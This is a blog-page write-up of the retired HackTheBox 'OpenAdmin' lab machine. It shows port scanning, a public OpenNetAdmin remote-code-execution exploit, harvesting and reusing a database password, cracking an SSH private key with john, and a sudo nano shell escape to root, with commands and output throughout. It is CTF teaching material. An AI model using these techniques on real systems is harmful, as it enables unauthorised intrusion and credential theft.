@@ -1,0 +1,302 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[HackTheBox] OpenAdmin Writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="I worked on the OpenAdmin retired machine of HackTheBox, so I will write its writeup.
+Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.171 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2."><meta property="og:image" content><meta property="og:title" content="[HackTheBox] OpenAdmin Writeup"><meta property="og:description" content="I worked on the OpenAdmin retired machine of HackTheBox, so I will write its writeup.
+Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.171 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2."><meta property="og:type" content="article"><meta property="og:url" content="/posts/14/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-09T13:45:35+09:00"><meta property="article:modified_time" content="2022-05-09T13:45:35+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[HackTheBox] OpenAdmin Writeup"><meta name=twitter:description content="I worked on the OpenAdmin retired machine of HackTheBox, so I will write its writeup.
+Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.171 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[HackTheBox] OpenAdmin Writeup</h1><div class=meta>Posted on May 9, 2022</div></div><nav id=TableOfContents><ol><li><a href=#port-scan>Port Scan</a></li><li><a href=#port-80>Port 80</a></li><li><a href=#privilege-escalation-www-data---jimmy>Privilege Escalation <code>www-data</code> -> <code>jimmy</code></a></li><li><a href=#privilege-escalation-jimmy---joanna>Privilege Escalation <code>jimmy</code> -> <code>joanna</code></a></li><li><a href=#privilege-escalation-joanna---root>Privilege Escalation <code>joanna</code> -> <code>root</code></a></li><li><a href=#thoughts>Thoughts</a></li></ol></nav><section class=body><p>I worked on the OpenAdmin retired machine of HackTheBox, so I will write its writeup.</p><p><img src=/images/posts/14/label.png alt=label></p><h1 id=port-scan>Port Scan</h1><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.171
+PORT      STATE    SERVICE      VERSION
+22/tcp    open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp    open     http         Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+</code></pre><h1 id=port-80>Port 80</h1><p>Find the <code>/ona</code> directory with a directory scan using dirbuster.
+<img src=/images/posts/14/dirbuster_info.png alt=dirbuster>
+<img src=/images/posts/14/dirbuster_result.png alt=dirbuster></p><p>http://10.10.10.171/ona/</p><p>OpenNetAdmin version is 18.1.1.
+<img src=/images/posts/14/openadmin.png alt=ona></p><p>Use SearchSploit to investigate for this version of the vulnerability.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ searchsploit OpenNetAdmin
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                               |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                                | php/webapps/26682.txt
+OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                 | php/webapps/47772.rb
+OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                  | php/webapps/47691.sh
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>I found the exploit <a href=https://github.com/amriunix/ona-rce>OpenNetAdmin 18.1.1 - Remote Code Execution</a>. Run the exploit to get <code>www-data</code>&rsquo;s shell.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ git clone https://github.com/amriunix/ona-rce.git
+$ cd ona-rce
+$ python3 ona-rce.py exploit http://10.10.10.171/ona
+[*] OpenNetAdmin 18.1.1 - Remote Code Execution
+[+] Connecting !
+[+] Connected Successfully!
+sh$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><p>As I continued my investigation, I found the DB password <code>n1nj4W4rri0R!</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>sh$ pwd
+/opt/ona/www
+
+sh$ ls -la      
+total 72
+drwxrwxr-x 10 www-data www-data 4096 Nov 22  2019 .
+drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ..
+-rw-rw-r--  1 www-data www-data 1970 Jan  3  2018 .htaccess.example
+drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config
+-rw-rw-r--  1 www-data www-data 1949 Jan  3  2018 config_dnld.php
+-rw-rw-r--  1 www-data www-data 4160 Jan  3  2018 dcm.php
+drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images
+drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include
+-rw-rw-r--  1 www-data www-data 1999 Jan  3  2018 index.php
+drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 local
+-rw-rw-r--  1 www-data www-data 4526 Jan  3  2018 login.php
+-rw-rw-r--  1 www-data www-data 1106 Jan  3  2018 logout.php
+drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules
+drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins
+drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc
+drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins
+
+sh$ ls config
+auth_ldap.config.php
+config.inc.php
+
+sh$ cat config.inc.php
+...
+// Include the localized Database settings
+$dbconffile = &#34;{$base}/local/config/database_settings.inc.php&#34;;
+...
+
+sh$ find . -name &#34;database_settings.inc.php&#34; 2&gt; /dev/null
+./local/config/database_settings.inc.php
+
+sh$ cat ./local/config/database_settings.inc.php
+&lt;?php
+
+$ona_contexts=array (
+  &#39;DEFAULT&#39; =&gt; 
+  array (
+    &#39;databases&#39; =&gt; 
+    array (
+      0 =&gt; 
+      array (
+        &#39;db_type&#39; =&gt; &#39;mysqli&#39;,
+        &#39;db_host&#39; =&gt; &#39;localhost&#39;,
+        &#39;db_login&#39; =&gt; &#39;ona_sys&#39;,
+        &#39;db_passwd&#39; =&gt; &#39;n1nj4W4rri0R!&#39;,
+        &#39;db_database&#39; =&gt; &#39;ona_default&#39;,
+        &#39;db_debug&#39; =&gt; false,
+      ),
+    ),
+    &#39;description&#39; =&gt; &#39;Default data context&#39;,
+    &#39;context_color&#39; =&gt; &#39;#D3DBFF&#39;,
+  ),
+);
+
+?
+</code></pre><p>And you can see that there are two users, <code>jimmy</code> and <code>joanna</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>sh$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin                                                                                                                               
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin                                                                                                                           
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin                                                                                                                               
+lxd:x:105:65534::/var/lib/lxd/:/bin/false                                                                                                                                      
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin                                                                                                                                  
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin                                                                                                                 
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin                                                                                                                      
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+</code></pre><h1 id=privilege-escalation-www-data---jimmy>Privilege Escalation <code>www-data</code> -> <code>jimmy</code></h1><p>I tried to log in with user: <code>jimmy</code>, pass: <code>n1nj4W4rri0R!</code> with ssh and it was successful.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ ssh jimmy@10.10.10.171
+jimmy@10.10.10.171&#39;s password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat May  7 13:31:57 UTC 2022
+
+  System load:  0.01              Processes:             170
+  Usage of /:   31.5% of 7.81GB   Users logged in:       0
+  Memory usage: 10%               IP address for ens160: 10.10.10.171
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+39 packages can be updated.
+11 updates are security updates.
+
+
+Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
+jimmy@openadmin:~$ id
+uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
+</code></pre><h1 id=privilege-escalation-jimmy---joanna>Privilege Escalation <code>jimmy</code> -> <code>joanna</code></h1><p>A web application is stored in <code>/var/www/internal</code>, and if you can log in as <code>jimmy</code> here, you can see that you can get the SSH private key of <code>joanna</code>. And jimmy&rsquo;s password hash is <code>00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>jimmy@openadmin:~$ ls -la /var/www/internal/
+total 20
+drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
+drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
+-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
+-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
+-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
+
+jimmy@openadmin:~$ cat /var/www/internal/index.php
+...
+&lt;h2&gt;Enter Username and Password&lt;/h2&gt;
+      &lt;div class = &#34;container form-signin&#34;&gt;
+        &lt;h2 class=&#34;featurette-heading&#34;&gt;Login Restricted.&lt;span class=&#34;text-muted&#34;&gt;&lt;/span&gt;&lt;/h2&gt;
+          &lt;?php
+            $msg = &#39;&#39;;
+
+            if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
+              if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) {
+                  $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;;
+                  header(&#34;Location: /main.php&#34;);
+              } else {
+                  $msg = &#39;Wrong username or password.&#39;;
+              }
+            }
+         ?&gt;
+      &lt;/div&gt; &lt;!-- /container --&gt;
+...
+
+jimmy@openadmin:~$ cat /var/www/internal/main.php
+&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) { header(&#34;Location: /index.php&#34;); }; 
+# Open Admin Trusted
+# OpenAdmin
+$output = shell_exec(&#39;cat /home/joanna/.ssh/id_rsa&#39;);
+echo &#34;&lt;pre&gt;$output&lt;/pre&gt;&#34;;
+?&gt;
+&lt;html&gt;
+&lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt;
+Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session
+&lt;/html&gt;
+</code></pre><p>If you <a href=https://md5hashing.net/hash/sha512/00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1>google</a> the hash value, you can see that the plaintext is <code>Revealed</code>. And the web application is expected to be running on port 52846.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>jimmy@openadmin:~$ ss -atn
+State                  Recv-Q               Send-Q                                      Local Address:Port                                     Peer Address:Port               
+LISTEN                 0                    80                                              127.0.0.1:3306                                          0.0.0.0:*                  
+LISTEN                 0                    128                                             127.0.0.1:52846                                         0.0.0.0:*                  
+LISTEN                 0                    128                                         127.0.0.53%lo:53                                            0.0.0.0:*                  
+LISTEN                 0                    128                                               0.0.0.0:22                                            0.0.0.0:*                  
+ESTAB                  0                    36                                           10.10.10.171:22                                         10.10.14.8:53332              
+SYN-SENT               0                    1                                            10.10.10.171:58652                                         1.1.1.1:53                 
+SYN-SENT               0                    1                                            10.10.10.171:58654                                         1.1.1.1:53                 
+LISTEN                 0                    128                                                     *:80                                                  *:*                  
+LISTEN                 0                    128                                                  [::]:22                                               [::]:*                  
+TIME-WAIT              0                    0                                   [::ffff:10.10.10.171]:80                                [::ffff:10.10.14.8]:46466
+</code></pre><p>Forward target 52846 port to local 52846 port using SSH tunneling.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ ssh -L 52846:localhost:52846 jimmy@10.10.10.171
+</code></pre><p>http://localhost:52846/</p><p><img src=/images/posts/14/52846app.png alt=52846></p><p>You can get <code>joanna</code>&rsquo;s ssh key by logging in with user: <code>jimmy</code>, pass: <code>Revealed</code>. But the SSH key is locked and the password is not <code>n1nj4W4rri0R!</code>.</p><p><img src=/images/posts/14/52846app_key.png alt=52846></p><p>Try SSH key password cracking with john. <a href=https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/>This article</a> will be helpful. If you crack it, you can see that the password is <code>bloodninjas</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ echo &#34;-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----&#34; &gt; id_rsa
+
+$ wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
+$ python3 ssh2john.py id_rsa &gt; id_rsa.hash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+bloodninjas      (id_rsa)
+Warning: Only 2 candidates left, minimum 4 needed for performance.
+1g 0:00:00:03 DONE (2022-05-08 23:27) 0.2747g/s 3940Kp/s 3940Kc/s 3940KC/sa6_123..*7¡Vamos!
+Session completed
+</code></pre><h1 id=privilege-escalation-joanna---root>Privilege Escalation <code>joanna</code> -> <code>root</code></h1><p>Log in using SSH with user: <code>joanna</code>, pass: <code>bloodninjas</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ chmod 400 id_rsa
+$ ssh -i id_rsa joanna@10.10.10.171
+Enter passphrase for key &#39;id_rsa&#39;: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon May  9 03:35:16 UTC 2022
+
+  System load:  0.0               Processes:             203
+  Usage of /:   30.9% of 7.81GB   Users logged in:       1
+  Memory usage: 14%               IP address for ens160: 10.10.10.171
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+39 packages can be updated.
+11 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
+joanna@openadmin:~$ id
+uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
+joanna@openadmin:~$ cat /home/joanna/user.txt
+*************************
+</code></pre><p>Running <code>sudo -l</code> shows that <code>/bin/nano /opt/priv</code> can be run with root privileges without a password.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>joanna@openadmin:~$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_keep+=&#34;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&#34;, env_keep+=&#34;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&#34;,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+</code></pre><p>Privilege escalation with reference to <a href=https://gtfobins.github.io/gtfobins/nano/#sudo>GTFObins</a>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>joanna@openadmin:~$ sudo /bin/nano /opt/priv
+</code></pre><p>Push <code>ctrl+R</code>, <code>ctrl+X</code> and input <code>reset; sh 1>&0 2>&0</code> and push <code>Enter</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash># id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+*************************
+</code></pre><h1 id=thoughts>Thoughts</h1><p>It was annoying because there were many user changes, but it was a machine where you could learn the basics.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/hackthebox>hackthebox</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
